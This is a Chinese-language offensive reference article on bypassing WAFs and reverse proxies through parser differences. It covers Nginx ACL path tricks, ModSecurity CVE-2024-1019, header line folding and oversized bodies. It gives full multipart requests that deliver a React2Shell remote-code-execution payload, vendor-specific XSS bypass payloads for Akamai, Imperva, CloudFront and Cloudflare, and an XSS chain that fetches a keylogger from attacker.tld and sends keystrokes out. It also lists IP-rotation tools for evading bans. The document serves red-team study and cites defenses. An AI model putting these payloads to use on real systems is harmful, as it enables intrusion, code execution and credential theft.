---
attack_surface:
  - 协议解析差异
  - 缓存/代理逻辑
impact:
  - 权限提升
  - 远程代码执行
  - 完整性破坏
  - 信息泄露
risk_level: 高
prerequisites:
  - HTTP/1.1 协议细节（头部、multipart、路径规范化）
  - 反向代理 / WAF 架构基础
  - 常见后端框架解析行为（NodeJS、Flask、Spring、PHP-FPM）
related_techniques:
  - http-request-smuggling
  - cache-poisoning
  - file-upload
  - xss
  - h2c-smuggling
  - unicode-normalization
difficulty: 中级
tools:
  - nowafpls
  - fireprox
  - ip-rotate
  - shadowclone
---

# Proxy & WAF Protections Bypass — 代理与 WAF 防护绕过

> 关联文档：[HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) · [Web Cache Poisoning & Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [基于 Multipart/form-data 换行符差异的通用 WAF 绕过技术](基于%20Multipartform-data%20换行符差异的通用%20WAF%20绕过技术.md)

---

# 0x01 原理与分类

## 1.1 核心原理：解析器语法不等价

WAF 与反向代理的防护逻辑依赖对 HTTP 请求的解析结果。当 WAF/代理层与后端服务器对同一请求的解析存在差异时（grammar un-equivalence，语法不等价），WAF 检查的是一个"无害的解释"，而后端重建出真实的恶意载荷。差异来源主要有四类：

- **路径规范化差异**：代理层在匹配 ACL 规则前执行路径规范化，但后端使用不同的规范化逻辑（移除代理层不会移除的字符）。
- **头部解析差异**：畸形头部（如 Line Folding 续行）在一端被忽略、在另一端被合并进头部值。
- **请求体解析差异**：multipart 边界符、charset、重复参数等语法歧义；或请求体超过 WAF 检查阈值导致完全不检查。
- **编码归一化差异**：WAF 对用户输入执行深度解码（如 URL 解码 10 次）或 Unicode 归一化，而应用不执行同等级处理，攻击者可在深度编码层隐藏有效 payload。

> **关键点**：绕过成功率取决于**代理层与后端解析器的实现差异**，而非 WAF 规则库本身的缺陷。红队需主动探测目标技术栈的解析特性，而非依赖通用 payload 库。

## 1.2 技术分类矩阵

| 类别 | 章节 | 根因 | 典型目标 |
|------|------|------|----------|
| 路径操作绕过 | # 0x03 | 路径规范化不一致 | Nginx ACL、ModSecurity、PHP-FPM |
| 请求解析绕过 | # 0x04 | 头部/请求体解析不一致 | AWS WAF、各厂商请求体阈值、CDN 静态资源策略 |
| Multipart 解析差异 | # 0x05 | 表单语法不等价 | Vercel WAF、阿里云 WAF、ModSecurity |
| 内容混淆绕过 | # 0x06 | 编码归一化层级差异 | Akamai、Imperva、Cloudflare、正则规则库 |
| 协议层与基础设施 | # 0x07 | 协议转换差异 / 防护边界外 | H2C、IP 信誉与限速 |

## 1.3 知识路径

```plaintext
Proxy & WAF Protections Bypass（本文档）
  ├── 前置知识：HTTP 协议基础、反向代理架构
  ├── 下一步：HTTP Request Smuggling（同为解析差异，作用于请求边界）
  ├── 下一步：Web Cache Poisoning（静态资源绕过 + 缓存投毒链）
  └── 相关：File Upload WAF Bypass、XSS 过滤器绕过
```

---

# 0x02 检测与前置条件

## 2.1 解析器差异探测

在尝试绕过之前，先测绘目标的解析差异：

1. **路径探测**：对受保护端点（如 `/admin`）发送变体 `/admin%A0/`、`/admin%09/`、`/admin;/`、`/admin%2e`，对比 WAF 拦截响应（403）与后端响应（200/302），判定哪类字符穿透了前端规范化。
2. **请求体阈值探测**：发送逐步增大的 POST 请求体（8 KB → 64 KB → 128 KB 以上），在临界位置放置触发 WAF 规则的测试字符串（如 `' OR '1'='1`），观察拦截行为消失的阈值点。
3. **multipart 回显端点**：寻找或自建能回显后端解析结果的端点（如文件上传回显、调试接口），保持后端 payload 不变、仅变异传输语法，diff WAF 决策与后端解析结果。
4. **静态资源检查强度**：对 `.js`/`.css` 路径发送含恶意特征的 `User-Agent`，对比动态端点的拦截差异。

## 2.2 WAF 平台指纹

- 响应头与错误页指纹（`Server`、拦截页样式、特定状态码）。
- IP 信誉行为：被标记的 IP 可能触发路由变更，导致绕过技术失效——优先使用未标记的干净 IP 测试。
- 协议版本：HTTP/2 对头部严格标准化，多数头部类绕过仅适用于 HTTP/1.1。

---

# 0x03 路径操作类绕过

## 3.1 Nginx ACL 规则绕过（路径规范化差异）

技术研究来源：[Exploiting HTTP Parsers Inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)（原文已迁移至 blog.bugport.net）。

典型 Nginx ACL 配置：

```plaintext
location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
```

为防止绕过，Nginx 在检查路径前会执行路径规范化。然而，如果后端服务器执行**不同的规范化**（移除 Nginx 不会移除的字符），就可以绕过此防御：Nginx 认为路径不等于 `/admin` 放行请求，而后端将该字符 trim 掉之后恰好命中受保护端点。

## 3.2 后端框架差异化绕过矩阵

### 3.2.1 NodeJS - Express

| Nginx 版本 | Node.js 绕过字符 |
| ---------- | ---------------- |
| 1.22.0     | `\xA0`           |
| 1.21.6     | `\xA0`           |
| 1.20.2     | `\xA0`, `\x09`, `\x0C` |
| 1.18.0     | `\xA0`, `\x09`, `\x0C` |
| 1.16.1     | `\xA0`, `\x09`, `\x0C` |

利用条件：Express 框架未执行额外的路径规范化。

### 3.2.2 Flask

| Nginx 版本 | Flask 绕过字符 |
| ---------- | -------------- |
| 1.22.0     | `\x85`, `\xA0` |
| 1.21.6     | `\x85`, `\xA0` |
| 1.20.2     | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0     | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1     | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

利用条件：Werkzeug 解析器接受非常规空白字符（高版本 Nginx 字符集扩大）。

### 3.2.3 Spring Boot

| Nginx 版本 | Spring Boot 绕过字符 |
| ---------- | -------------------- |
| 1.22.0     | `;`                  |
| 1.21.6     | `;`                  |
| 1.20.2     | `\x09`, `;`          |
| 1.18.0     | `\x09`, `;`          |
| 1.16.1     | `\x09`, `;`          |

利用条件：Tomcat 路径分割逻辑接受 matrix parameter 分隔符 `;`。

### 3.2.4 PHP-FPM

Nginx FPM 配置：

```plaintext
location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```

Nginx 配置为阻止访问 `/admin.php`，但可以通过访问 `/admin.php/index.php` 绕过：精确匹配 `location = /admin.php` 未命中，请求落入 `location ~ \.php$` 被转发给 PHP-FPM，而后端 PHP-FPM 将 `admin.php` 识别为脚本路径执行。

**防御方案**（来自源文档 How to prevent）：精确路径匹配（`=`）存在系统性绕过风险，应强制使用正则匹配：

```plaintext
location ~* ^/admin {
    deny all;
}
```

## 3.3 ModSecurity 路径混淆（CVE-2024-1019）

来源：[ModSecurity: Path Confusion and really easy bypass on v2 and v3](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)。

- **ModSecurity v3（< 3.0.12）**：`REQUEST_FILENAME` 变量实现不当——它在提取路径**之前先执行了 URL 解码**。因此请求 `http://example.com/foo%3f';alert(1);foo=` 中，`%3f` 被解码为 `?`，ModSecurity 认为路径只是 `/foo`（其后内容被当作 query string 排除在规则检查之外），但服务器实际接收的路径是 `/foo%3f';alert(1);foo=`。变量 `REQUEST_BASENAME` 和 `PATH_INFO` 同样受此 bug 影响。该行为属于**未文档化的隐式 URL 解码**。
- **修复状态**：v3 分支已在 3.0.12 修复，分配编号 **CVE-2024-1019**；**v2 分支至今未修复**。
- **ModSecurity v2**：未正确处理 URL 编码的 `.`（如 `%2e`），可绕过阻止访问备份文件扩展名（如 `.bak`）的防护：`https://example.com/backup%2ebak` → 规则匹配 `.bak` 失败，但后端视为 `/backup.bak`。
- **影响面**：OWASP Core Rule Set 在 Generic、PHP、XSS、LFI、RFI、SQLi、Java、Protocol Violation、Protocol Enforcement 等规则集中广泛使用 `REQUEST_FILENAME`，该变量失效意味着整个规则集对路径中的 payload 完全失明。

攻击链：`构造畸形路径` → `WAF 误判路径` → `后端执行原始路径` → `绕过访问控制 / 注入`。

---

# 0x04 请求解析类绕过

## 4.1 AWS WAF 畸形头部（Line Folding）

通过构造畸形 HTTP 头部结构，利用 AWS WAF 与后端服务器的头部解析差异（来源同 rafa 研究，**AWS 已修复此问题**，历史部署仍可能存在）：

```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```

- **AWS WAF 行为**：不理解 `\t` 开头的续行是 `X-Query` 头部值的一部分，按无效头部忽略。
- **NodeJS 后端行为**：将 `\t` 续行合并进 `X-Query` 的值，完整 SQL 注入 `' or '1'='1' --` 被执行。

原理：Node.js、Flask 等服务器存在 **Line Folding**（行折叠）行为——用 `\x09`（tab）和 `\x20`（空格）将长头部值拆分为多行。例如头部 `1337: Value\r\n\t1337` 会被解释为 `1337: Value\t1337`。

> **限制**：仅适用于 **HTTP/1.1**（HTTP/2 头部严格标准化）；优先测试 `\t`、`\r`、`\n` 在头部值中的续行特性。

## 4.2 请求体大小限制绕过

WAF 通常只检查一定长度以内的请求体；超过阈值的 POST/PUT/PATCH 请求不会被检查，恶意 payload 直接到达后端。

| WAF 平台 | 最大检查长度 | 超限行为 |
|----------|--------------|----------|
| AWS WAF — ALB / AppSync | 8 KB | 超限不检查 |
| AWS WAF — CloudFront / API Gateway / Cognito / App Runner / Verified Access | 64 KB | 超限不检查 |
| Azure WAF — CRS 3.1 及以下 | 128 KB | 可关闭请求体检查，超限消息不做漏洞检查 |
| Azure WAF — CRS 3.2 及以上 | 可配置（可禁用最大请求体限制） | 预防模式：记录并阻断；检测模式：检查至上限、忽略其余、`Content-Length` 超限时记录日志 |
| Akamai | 8 KB（默认） | 可通过添加 Advanced Metadata 提升至 128 KB |
| Cloudflare | 128 KB | 超限不检查 |

攻击链：`确认目标 WAF 平台与阈值` → `发送超大请求体` → `将恶意 payload 置于阈值之后` → `WAF 跳过检查`。工具见 # 0x09 的 nowafpls（Burp 插件，自动向请求填充垃圾数据撑大长度）。

## 4.3 静态资源检查缺口（.js GET）

部分 CDN/WAF 对静态资源（如以 `.js` 结尾的路径）的 GET 请求实施弱检查甚至不做内容检查，仅应用全局规则（IP 限速、信誉库），同时静态扩展名通常被自动缓存。这可以被滥用于投递或"播种"恶意变体，影响后续的 HTML 响应。

实战用法：

1. 在对 `.js` 路径的 GET 请求中，将 payload 放在不受信任的头部（如 `User-Agent: <script>alert(1)</script>`）以避开内容检查，随后立即请求主 HTML 页面影响缓存变体。
2. 使用干净 IP：一旦 IP 被标记，路由变化会使该技术不可靠。
3. 在 Burp Repeater 中使用 "Send group in parallel"（单数据包方式）让 `.js` 与 HTML 两个请求经同一前端路径竞速通过。

该技术本质上是头部反射缓存投毒的前置步骤，完整的投毒链与缓存键分析见 [Web Cache Poisoning & Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md)。实战案例：[0-Click Account Takeover（SSO 误配置 + self-XSS + 缓存投毒链，5 位数赏金）](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)。

---

# 0x05 Multipart 解析差异绕过

## 5.1 语法不等价原理

针对解析器驱动漏洞的应急 WAF 规则（如 React2Shell 期间各厂商部署的规则）会**自行解析 `multipart/form-data`**，然后只扫描重建出的字段。这种做法很脆弱：如果 WAF 与后端没有实现**相同的语法**，WAF 检查的是一个无害的解释，而后端重建出真实的 payload。应将其视为**语法不等价**问题，而非纯粹的签名绕过。

这在 **React2Shell**（CVE-2025-55182，React Server Functions 预认证 RCE，影响 Next.js 15.x–16.0.6 及 react-router、Waku、@parcel/rsc、@vitejs/plugin-rsc、rwsdk）等利用链中尤为关键：恶意服务端对象图可以保持不变，只变异 **HTTP 传输语法**，直到 WAF 与源站产生分歧。这些歧义与 [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) 的解析差异高度重叠。

## 5.2 高价值解析差异检查点

- **顶层 `Content-Type` 解析**：重复 `boundary=` 参数、引号有无、空格、转义、RFC 5987 参数、多个 `Content-Type` 头、大小写敏感性、非法/非 UTF-8 字节。
- **multipart 框架**：首个边界符前/后的垃圾数据、`\r\n` vs `\n`、超大请求体处理、重复字段名、畸形结束标记（如 `--boundary-- ` 带尾空格）。
- **部件级头部**：重复 `Content-Type`、`Content-Disposition` 怪癖（`filename`、`filename*=`）、部件级 charset（如 `utf16le` / `ucs2`）、重复子头部、`Content-Transfer-Encoding`。

## 5.3 可利用模式

- **重复参数优先级错配**：WAF 取最后一个 `boundary=` 而后端取第一个 → WAF 解析出空请求体，后端解析攻击者控制的部件。
- **解析器错误即放行（fail-open）**：畸形头部或非法字节使 WAF 解析器报错，而请求仍被转发 → 检查被事实性关闭。
- **部件级 charset 解码缺口**：后端在 multipart 部件内接受 `Content-Type: text/plain; charset=utf16le`（或 `ucs2`），而 WAF 扫描原始字节 → `:constructor` 等被封堵标记可藏在编码后的请求体中。`busboy`（Node.js 主流 multipart 解析器）的源码确认其将 `utf16le` / `utf-16le` / `ucs2` / `ucs-2` 全部映射到 UTF-16 解码器（`decoders.utf16le`，经 `ucs2Slice` 解码），见 [busboy lib/utils.js](https://github.com/mscdex/busboy/blob/6b3dcf69d38c1a8d53a0b3e4c88ba296f6c91525/lib/utils.js#L403-L406)。
- **重复 multipart 子头部**：同一部件内重复 `Content-Type` 可制造第二级优先级错配——WAF 看到 `charset=utf8`，后端接受第一个 `charset=utf16le`。
- **边界终止符怪癖**：WAF 接受 `--boundary-- `（带尾空格）为结束标记，而后端因尾空格拒绝 → WAF 过早停止扫描，后端继续解析后续部件。

## 5.4 实战案例：Vercel React2Shell WAF 五连绕过

来源：[$170k in Bypasses: The Vercel React2Shell Challenge — Hacktron](https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass)。Vercel 为 React2Shell 悬赏每个独立 WAF 绕过 5 万美元，最终 116 名研究者参与、验证 20 种独立绕过、发放超 100 万美元赏金（Hacktron 团队获 17 万美元）。以下为该团队黑盒发现的 5 个绕过，逐一对应 §5.3 的模式。WAF 行为为黑盒推断，且在对抗期间快速演化。

### 5.4.1 WAF 行为观测（初始形态）

1. 解析表单请求体
2. 忽略边界符外的垃圾数据
3. 对表单值执行 JSON 反转义
4. 任何值中出现 `:constructor` 则阻断

### 5.4.2 Bypass 1：重复 boundary 参数

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary=y; boundary=x
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $VERCEL_PLATFORM_PROTECTION').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_formData":{"get":"$1:constructor:constructor"}}}
--y
Content-Disposition: form-data; name="1"

"$@0"
--y--
```

WAF 认为边界符是 `x` 从而忽略整个请求体；后端认为是 `y` 并正常解析。payload 原型来自 @maple3142，修改了 JS 代码使命令输出回显在响应头（利用 `NEXT_REDIRECT` digest 通道）。

### 5.4.3 Bypass 2：头部非 UTF-8 字节（fail-open）

WAF 在此期间升级为"解析失败即放行"。在任意头部放入非 UTF-8 字节（如 `boundary="y"; a="b<0x88>"`，最初用 `y<0x88>` 作边界符时发现），WAF 解析器直接失败并将请求原样转发，不做任何清洗。请求体与 Bypass 1 相同。

### 5.4.4 Bypass 3：UTF-16LE charset

在 multipart 部件内添加 `Content-Type: text/plain; charset=utf16le`，busboy 会用 `ucs2Slice` 按 UTF-16 解码该部件的值，而 WAF 扫描原始字节看不到 `:constructor`：

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary="y"
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

{<0x00>"<0x00>t<0x00>h<0x00>e<0x00>n<0x00>"<0x00> [...UTF-16LE 编码的 React2Shell payload]
--y
Content-Disposition: form-data; name="1"

"$@0"
--y--
```

注：部件级 `charset=utf16`（不带 le）时后端返回 `undefined`，由此顺藤摸瓜发现 busboy 的 charset 支持表（另存在一个"编码而非解码"的 buggy base64 模式）。

### 5.4.5 Bypass 4：部件内重复 Content-Type

WAF 再次进化：检测重复 `boundary=`、多个顶层 `Content-Type`、解析失败即阻断、非 utf8 charset 即阻断、表单值 JSON 反转义两次、封堵 `"_response":` 与 `:constructor`。绕过方式——在同一部件内放两个 `Content-Type`：

```http
--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le
Content-Type: text/plain; charset=utf8

<UTF-16LE 编码的 payload，同 5.4.4>
```

WAF 看到 `charset=utf8` 放行；busboy 使用第一个（`charset=utf16le`）解码。

### 5.4.6 Bypass 5：结束边界符尾空格

WAF 接受 `--y-- `（带尾空格）作为结束标记，后端（busboy）将其视为垃圾数据：

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Content-Type: multipart/form-data; boundary="y"
Next-Action: x
Content-Length: [...auto]

--y-- 
--y
Content-Disposition: form-data; name="foo"

1
--y
Content-Disposition: form-data; name="0"

<React2Shell payload，同 5.4.2>
--y
Content-Disposition: form-data; name="1"

"$@0"
--y--
```

请求体开头的 `--y-- ` 让 WAF 认为表单已结束，其后内容全部被当作边界外垃圾忽略；后端尚未开始解析，将第一行视为垃圾后继续正常处理后续部件。

### 5.4.7 WAF 最终形态（防御参考）

五连绕过之后，Vercel 放弃逐条修补解析差异，转向消除差异本身：

1. 检测 `Content-Type` 中重复 `boundary=`
2. 检测多个 `Content-Type` 头
3. 从**原始请求体**中移除所有 `<0x00>` 字节
4. 对**原始请求体**执行两次 JSON 反转义
5. 在**原始请求体**（而非解析后的字段）上封堵 `"_response"\s*:` 与 `:constructor`

这彻底消除了 WAF 与后端之间的 HTTP 解析差异，代价是性能损耗与潜在误报。披露后数周内该 WAF 拦截了超过 600 万次利用尝试。

## 5.5 CRLF/LF 换行符差异（跨 WAF 通用）

RFC 7578 要求 multipart 使用 CRLF（`\r\n`）作为行分隔符；多数 WAF 弱化该检查，把单独 `\n` 也当作有效分隔符，而后端（Java/Tomcat、PHP、NodeJS）严格只认 `\r\n`。将目标参数值末尾的 `\r\n` 替换为 `\n`，边界符即被后端吞进参数值，而 WAF 误认为新参数起点：

```http
POST /search HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJhvWUjzh80leEROu

------WebKitFormBoundaryJhvWUjzh80leEROu
Content-Disposition: form-data; name="keyword"

1'/*\n
------WebKitFormBoundaryJhvWUjzh80leEROu
Content-Disposition: form-data; name="xx"

*/or 1=1--\r\n
------WebKitFormBoundaryJhvWUjzh80leEROu--
```

- WAF 视角：`keyword = "1'/*"`、`xx = "*/or 1=1--"` → 无风险
- 后端接收：`keyword = "1'/*\n------WebKitFormBoundary...*/or 1=1--"` → 完整 SQL 注入

文件上传场景同样适用：将 `Content-Disposition` 行的 `\r\n` 改为 `\n`，后端把 `\n------WebKitFormBoundary...` 吞入文件名，扩展名从 `.png` 变为 `.jspx` 绕过白名单——更完整的文件上传混淆手法见 [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md)。该技术的完整矩阵（含阿里云 WAF / ZW WAF 实测数据、sqlmap tamper 脚本、混淆参数生成器）见同目录补充文档 [基于 Multipart/form-data 换行符差异的通用 WAF 绕过技术](基于%20Multipartform-data%20换行符差异的通用%20WAF%20绕过技术.md)。

## 5.6 测试工作流

1. 找到或自建能展示**后端解析器**如何重建每个 multipart 字段的端点。
2. 保持**后端 payload** 不变，只变异**传输语法**。
3. 在 fuzz 重复参数、重复头部、畸形字节、部件 charset、结束边界符语法的同时，diff WAF 决策与后端解析结果。
4. 将"解析错误 ⇒ 放行"视为严重发现；先用无害标记字符串验证，再重放真实利用 payload。

---

# 0x06 内容混淆类绕过

## 6.1 通用混淆

```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```

## 6.2 Unicode 兼容性

后端若在输入清洗**之后**执行 Unicode 兼容性归一化，兼容字符可绕过 WAF 并按预期 payload 执行。Unicode 归一化有四种标准形式：NFC（规范组合）、NFD（规范分解）、NFKC（兼容组合）、NFKD（兼容分解）；其中 NFKC/NFKD 执行**兼容性**转换，是绕过利用的重点（研究来源：[WAF Bypassing with Unicode Compatibility — jlajara](https://jlajara.gitlab.io/Bypass_WAF_Unicode)，兼容字符查询表：[compart.com](https://www.compart.com/en/unicode)）。

验证归一化行为的 Python 片段：

```python
import unicodedata
string = "𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃"
print('NFC: '  + unicodedata.normalize('NFC',  string))  # 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
print('NFD: '  + unicodedata.normalize('NFD',  string))  # 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
print('NFKC: ' + unicodedata.normalize('NFKC', string))  # Leonishan
print('NFKD: ' + unicodedata.normalize('NFKD', string))  # Leonishan
```

典型漏洞形态：Flask 应用在 `waf(name)` 检查通过后才执行 `unicodedata.normalize('NFKD', name)`，WAF 黑名单中的 `<`、`>`、`=` 等字符可用兼容等价物绕过：

```bash
# 在 NFKD 归一化算法下，左侧字符转换为右侧的 XSS payload
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```

针对 JavaScript/CSS 上下文，优先测试全角符号（`＜`、`⁼`、`＇`）与组合字符。

## 6.3 上下文感知 WAF 编码绕过

来源：[Exploring Javascript events & Bypassing WAFs via character normalization — 0x999](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization)。

核心思路：滥用 WAF 自身的输入归一化。研究发现 **Akamai 会将用户输入 URL 解码 10 次**，因此 `<input/%2525252525252525253e/onfocus` 会被 Akamai 看作 `<input/>/onfocus`——标签已闭合，WAF 认为无害放行；但只要应用不同时解码 10 次，受害者端实际得到 `<input/%25252525252525253e/onfocus`，**仍然是有效的 XSS**。这使攻击者可以把 payload 藏在 WAF 会解码而受害者不会解码的编码层中。该手法不限于 URL 编码，同样适用于 Unicode、十六进制、八进制等编码。

各厂商实测绕过 payload：

- Akamai：`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva：`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront：`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare：`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

研究还测绘了各 WAF 实际归一化的编码种类（测试在各厂商主站上进行，自定义配置下结果可能不同）：

| WAF | 多次 URL 解码 | 命名实体 `&lt;` | 数值实体 `&#x3c;` | 十六进制 `\x3c` | Unicode `\u003c` | `\u{3c}` | `%u003c` |
|-----|---------------|-----------------|--------------------|-----------------|------------------|----------|----------|
| Cloudflare | 是（2 次） | 是 | 是 | 是 | 是 | 否 | 是 |
| CloudFront/AWS | 是（2 次） | 是 | 是 | 是 | 是 | 否 | 是 |
| F5 | 是（2 次） | 是 | 否 | 是 | 否 | 否 | 否 |
| Barracuda | 是（2 次） | 是 | 是 | 是 | 是 | 否 | 是 |
| Fortiweb | 是（64 次） | 是 | 是 | 是 | 是 | 是 | 是 |
| Sucuri | 是（2 次） | 否 | 否 | 否 | 否 | 否 | 否 |

> **注意**：并非表中所有 WAF 都能用同一手法绕过——它们往往还检查其他模式（如 `anyevent=[a-z]`），需按目标定制。

另一个上下文误用案例：Akamai 允许在 `/*` 与 `*/` 之间放置任意内容（推测因其尝试按 JS/SQL 注释解析）。因此 SQL 注入 `/*'or sleep(5)-- -*/` 不会被拦截——`/*` 是注入的起始字符串，而 `*/` 被注释掉。实测封装形式如 `?author=/*' OR 1=1-- -*%2f`。这类上下文问题还可用于**滥用 WAF 预期之外的其他漏洞类型**（例如用同一缺口打 XSS 而非 SQLi）。

## 6.4 内联 JavaScript 首语句检查缺口

部分内联检查规则集只解析事件处理器中的**第一条 JavaScript 语句**。以括号包裹的无害表达式加分号作为前缀（例如 `onfocus="(history.length);payload"`），分号后的恶意代码可绕过检查，浏览器仍会完整执行。

完整攻击链（来源：[hackcommander 案例研究](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)，目标为企业 SSO 登录页，`service` 参数反射进 `<a id="forgot_btn">` 的 `href` 属性）：

1. **注入处理器**：`onclick="print(1)"` 被拦截，但将 payload 拆成至少两条语句、且**第一条语句使用括号**，第二条语句即可注入原本被 WAF 封锁的 JS 代码：`onfocus="(history.length);malicious_code_here"`。
2. **免点击触发**：浏览器会自动聚焦 `id` 与 URL 片段匹配的元素，在利用 URL 后追加 `#forgot_btn` 使锚点在页面加载时聚焦，handler 无需用户点击即执行。
3. **精简内联桩**：目标站点已加载 jQuery，handler 只需通过 `$.getScript(...)` 引导加载攻击者服务器上的完整 keylogger。
4. **无引号构造字符串**：单引号被 URL 编码、转义双引号会破坏属性解析，因此用 `String.fromCharCode` 生成所有字符串。

辅助转换函数：

```javascript
function toCharCodes(str){
  return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```

最终属性形态：

```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```

外联脚本挂钩 `document.onkeypress` 缓冲击键，每秒通过 `new Image().src = collaborator_url + keys` 外发。该 XSS 只对未认证用户触发，因此攻击目标就是登录表单本身——受害者在登录页输入的凭据被直接记录。案例的完整分析见 [XSS — Attribute-only login XSS behind WAFs](../../User%20input/Reflected%20Values/XSS/README.md)。

## 6.5 正则表达式绕过矩阵

绕过防火墙正则过滤的通用技术：大小写交替、插入换行、编码 payload。资源：[PayloadsAllTheThings — Filter Bypass and Exotic Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)、[OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)。以下示例来自 [allypetitt 的 WAF 绕过文章](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)：

```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```

---

# 0x07 协议层与基础设施绕过

## 7.1 H2C Smuggling

利用 HTTP/1.1 与 HTTP/2 转换层（h2c upgrade）的头部解析差异，将请求走私穿过 WAF/前端代理到达后端。需结合目标前端协议栈特性（如 Nginx + Tomcat 组合）。协议升级层的同类机制与实战细节见 [Upgrade Header Smuggling](../Upgrade%20Header%20Smuggling/README.md)。

## 7.2 IP 轮换

基于 IP 的限速与封禁是 WAF 的常见全局规则，可通过云 API Gateway 动态轮换出口 IP 规避：

- [FireProx](https://github.com/ustayready/fireprox)：通过 AWS API Gateway 创建临时代理 URL，可直接配合 ffuf 使用。
- [CATSpin](https://github.com/rootcathacking/catspin)：与 FireProx 类似的轻量级 API Gateway 代理轮换。
- [IP-Rotate（BApp）](https://github.com/PortSwigger/ip-rotate)：Burp Suite 插件，使用 API Gateway IP 自动轮换。
- [ShadowClone](https://github.com/fyoorer/ShadowClone)：按输入文件大小与分割因子动态激活容器实例，将输入分块并行执行（如 100 个实例处理按 100 行分割的 10,000 行输入），适合大规模目标快速探测。

